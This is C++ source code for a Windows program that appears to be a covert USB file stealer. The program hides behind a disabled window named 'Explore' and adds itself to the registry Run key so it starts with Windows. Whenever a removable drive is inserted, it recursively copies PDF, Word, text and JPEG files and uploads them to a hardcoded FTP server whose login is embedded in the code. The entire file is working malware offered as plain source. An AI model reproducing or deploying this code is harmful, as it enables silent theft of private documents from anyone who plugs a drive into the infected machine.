#include<iostream>
#include<fstream>
#include<cstring>
#include<io.h>
#include<tchar.h>
#include<direct.h>
#include<afxinet.h>//ftp支持
#include<Windows.h>
#include<dbt.h>

#define DESTEST "d:/temp/"//目标目录
#define FTP "45.77.210.206"
#define PASSWD "daojianshenyu"
#define USER "ftpuser"

#pragma comment  (lib,"User32.lib")  //窗口化部分的支持
#pragma comment  (lib,"Gdi32.lib") //窗口化部分的支持
#pragma comment (lib,"Advapi32.lib")//用于支持注册表编辑
std::string USB;//USB盘符
CInternetSession session("FTP server");
CFtpConnection* Pftp;

using namespace std;


bool TestInet() {//网络连通测试
	Pftp = session.GetFtpConnection(FTP, USER, PASSWD);
	if (Pftp == 0) { Pftp->Close(); delete Pftp; return false; }
	if (Pftp->GetFile("test", "d:/temp/test", FALSE, FILE_ATTRIBUTE_NORMAL, FTP_TRANSFER_TYPE_UNKNOWN))
		return true;
	else { Pftp->Close(); delete Pftp; return false;}
}



void SetAutoRun(bool bAutoRun) {//设置开机自启
	HKEY hKey;//定义注册表键值指针
	const char* strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";//制定注册表键值目录
	if (bAutoRun) {
		if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {//尝试打开该键值
			TCHAR szModul[_MAX_PATH];//用以存储本程序自身位置
			GetModuleFileName(NULL, szModul, _MAX_PATH);//获得本程序所在目录
			RegSetValueEx(hKey, "autorun", 0, REG_SZ, (const BYTE*)(LPCSTR)szModul, strlen(szModul));//注册开机自启键值
			RegCloseKey(hKey);//关闭注册表
			//MessageBox(NULL, "开机启动设置成功", "Notice", MB_OK);
		}
		else {
			//MessageBox(NULL,"系统参数错误，无法随系统启动","Notice",MB_OK);
		}
	}
	else {//取消开机自启
		if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {//尝试打开注册表键值
			RegDeleteKeyValue(hKey,NULL,"autorun");//删除开机自启
			RegCloseKey(hKey);//关闭注册表
			//MessageBox(NULL, "开机启动已关闭", "Notice", MB_OK);
		}
	}

}


std::string GetUSBroot()//USB盘符获取函数
{
	std::string UDiskRoot = "";
	UINT DiskType;
	size_t szAllDriveStr = GetLogicalDriveStrings(0, NULL);
	char *pDriveStr = new char[szAllDriveStr + sizeof(_T(" "))];
	char *pForDelete = pDriveStr;
	GetLogicalDriveStrings(szAllDriveStr, pDriveStr);
	size_t szDriveStr = strlen(pDriveStr);
	while (szDriveStr > 0)
	{
		DiskType = GetDriveType(pDriveStr);
		switch (DiskType)
		{
		case DRIVE_NO_ROOT_DIR:
			break;
		case DRIVE_REMOVABLE:
			// 移动存储设备  
			UDiskRoot = pDriveStr;
			break;
		case DRIVE_FIXED:
			// 固定硬盘驱动器  
			break;
		case DRIVE_REMOTE:
			// 网络驱动器  
			break;
		case DRIVE_CDROM:
			// 光盘驱动器  
			break;
		}

		pDriveStr += szDriveStr + 1;
		szDriveStr = strlen(pDriveStr);
	}
	delete pForDelete;
	return UDiskRoot;
}



void FileSearch(std::string Path,int Layer) {
	_finddata_t file_info;//声明文件类
	std::string current_path = Path + "/*.*";//声明字符串用以存放当前目录
	int handle;//文件类句柄
	if ((handle = _findfirst(current_path.c_str(), &file_info)) != -1) {
		do {
			if (file_info.attrib == _A_SUBDIR) {//判定文件类型 目录
				if (strcmp(file_info.name, ".") != 0 && strcmp(file_info.name, "..") != 0) {
					FileSearch(Path + '/' + file_info.name, Layer + 1);
				}
			}
			else {//判定文件类型 文件
				std::string file;
				std::string dest;
				file = file_info.name;
				if (file.find(".pdf") != file.npos || //pdf copy
					file.find(".doc") != file.npos || //doc copy
					file.find(".docx") != file.npos ||//docx copy
					file.find(".txt") != file.npos ||//txt copy
					file.find(".jpg") != file.npos) {//jpg copy
					dest = DESTEST + file;
					file = Path + '/' + file_info.name;
					if (_access(DESTEST, 00) == 0) {
						CopyFile(file.c_str(), dest.c_str(), FALSE);//判断目标文件夹是否存在
						if (TestInet()) Pftp->PutFile(dest.c_str(), file_info.name, FTP_TRANSFER_TYPE_UNKNOWN);
						//尝试连接ftp服务器并传输
					}
					else {//不存在 先创建再复制
						_mkdir(DESTEST);
						CopyFile(file.c_str(), dest.c_str(), FALSE);
						if (TestInet()) Pftp->PutFile(dest.c_str(), file_info.name, FTP_TRANSFER_TYPE_UNKNOWN);
						//尝试连接ftp服务器并传输
					}
					Sleep(250);//暂停 防止过多占用性能
				}
			}
		} while (!_findnext(handle, &file_info));
		_findclose(handle);
	}
	else {
		return;
	}
}



LRESULT OnDeviceChange(HWND hwnd,WPARAM wParam,LPARAM lParam){
	PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
	/*
	wParam中存储了WM_DEVICECHANGE 插入（DBT_DEVICEARRIVAL）移除（DBT_DEVICEREMOVECOMPLETE）
	lParam为指针，指向存储变更设备的细节消息
		设备的详细情况
	*/
	switch (wParam) {
	case DBT_DEVICEARRIVAL://插入消息
		//MessageBox(NULL, "USB arrived!", "NOTICE", MB_OK);
		if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME) {
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			USB.clear();
			USB =GetUSBroot()+'/';//获取USB盘符
			FileSearch(USB, 0);//检索文件并复制
		}
		break;
	case DBT_DEVICEREMOVECOMPLETE://移除消息
		//MessageBox(NULL, "USB removed!", "Notice!", MB_OK);
		break;
	}
	return LRESULT();

}



LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {//消息处理函数
	switch (Message)
	{
	case WM_CREATE://窗体创建消息
		SetAutoRun(true);//设置开机自启
		_mkdir(DESTEST);//system("mkdir d:\\temp");//创建目标目录
		break;
	case WM_DESTROY://窗体结束消息
		SetAutoRun(false);
		PostMessage(hwnd, WM_QUIT, wParam, lParam);//发送结束消息给系统
		break;
	case WM_TIMER://Timer消息 无用
		break;
	case WM_DEVICECHANGE://设备变更消息
		OnDeviceChange(hwnd, wParam, lParam);
		break;
	default: 
		return DefWindowProc(hwnd, Message, wParam, lParam);//windows默认消息处理函数
		break;
	}
	return 0;
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	WNDCLASS wc;//声明窗体类
	HWND hwnd;//声明窗体句柄
	MSG msg;//声明消息

	wc.cbClsExtra = NULL;//设定控制台额外缓冲区
	wc.cbWndExtra = NULL;//设定窗口窗口额外缓冲区
	wc.hbrBackground =(HBRUSH) COLOR_WINDOW;//设定窗口背景色样式
	wc.hCursor = NULL;//设定鼠标样式
	wc.hIcon = NULL;//设定图标样式
	wc.hInstance = hInstance;//设定实例句柄
	wc.lpszClassName = "Explore";//窗体类名称
	wc.lpszMenuName = NULL;//设定菜单名称
	wc.style = NULL; //设定窗口样式，响应的消息
	wc.lpfnWndProc = WndProc;//设定消息回调函数
	
	if (!RegisterClass(&wc)) {
		MessageBox(NULL, "Windows Registration Faild", "ERROR", MB_OK);
		return 0;
	}//注册窗体类

	hwnd = CreateWindow(wc.lpszClassName, "Test", WS_DISABLED, 0, 0, 100, 100, NULL, NULL, hInstance, NULL);
	if (hwnd == NULL) {
		MessageBox(NULL, "Creating Windows Failed", "ERROR", MB_OK);
		return 0;
	}//创建窗口

	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);//转换消息格式
		DispatchMessage(&msg);//将消息发给处理函数
	}//消息处理
	return msg.wParam;
}